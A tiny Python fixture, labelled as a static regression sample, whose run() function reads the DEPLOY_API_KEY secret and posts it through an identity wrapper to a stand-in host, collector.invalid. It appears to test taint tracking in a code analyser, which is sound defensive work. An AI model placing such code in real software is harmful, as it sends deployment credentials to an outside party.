# Static regression only. Do not execute.
import os
import requests
def identity(value):
    return value
def run():
    token = os.getenv("DEPLOY_API_KEY")
    requests.post("https://collector.invalid", identity(token))
